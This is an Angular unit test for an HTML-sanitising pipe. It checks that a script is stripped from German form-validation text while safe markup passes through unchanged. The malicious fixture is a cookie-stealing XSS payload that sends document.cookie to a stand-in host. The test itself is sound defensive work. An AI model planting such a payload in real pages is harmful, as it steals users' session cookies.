import { Component } from '@angular/core';
import { TestBed } from '@angular/core/testing';
import { QdSanitizeHtmlPipe } from './sanitize-html.pipe';

@Component({
  selector: 'test',
  template: '<div [innerHTML]="maliciousHtml | sanitizeHtml"></div>'
})
class TestComponentWithMaliciousHtml {
  maliciousHtml =
    '<span>Bitte ergänzen und korrigieren Sie die Eingaben, damit das Abschicken möglich ist.</span><SCRIPT>var+img=new+Image();img.src="http://evil-cake-monster/"%20+%20document.cookie;</SCRIPT>';
}

@Component({
  selector: 'test',
  template: '<div [innerHTML]="secureHtml | sanitizeHtml"></div>'
})
class TestComponentWithSecureHtml {
  secureHtml =
    '<p>Es gibt noch <strong>5</strong> ungültige oder unvollständige Eingaben.</p><p>Bitte ergänzen und korrigieren Sie die Eingaben, damit das Abschicken möglich ist.</p>';
}

describe(QdSanitizeHtmlPipe.name, () => {
  let component;
  let fixture;

  beforeEach(() => {
    TestBed.configureTestingModule({
      declarations: [TestComponentWithMaliciousHtml, TestComponentWithSecureHtml, QdSanitizeHtmlPipe]
    });
  });

  function createComponent(componentClass): void {
    fixture = TestBed.createComponent(componentClass);
    component = fixture.componentInstance;
    fixture.detectChanges();
  }

  test('malicious html is removed correctly', () => {
    createComponent(TestComponentWithMaliciousHtml);

    expect(fixture.nativeElement.innerHTML).toBe(
      '<div><span>Bitte ergänzen und korrigieren Sie die Eingaben, damit das Abschicken möglich ist.</span></div>'
    );
  });

  test('safe html is rendered correctly without any manipulation', () => {
    createComponent(TestComponentWithSecureHtml);

    expect(fixture.nativeElement.innerHTML).toBe(
      '<div><p>Es gibt noch <strong>5</strong> ungültige oder unvollständige Eingaben.</p><p>Bitte ergänzen und korrigieren Sie die Eingaben, damit das Abschicken möglich ist.</p></div>'
    );
  });
});
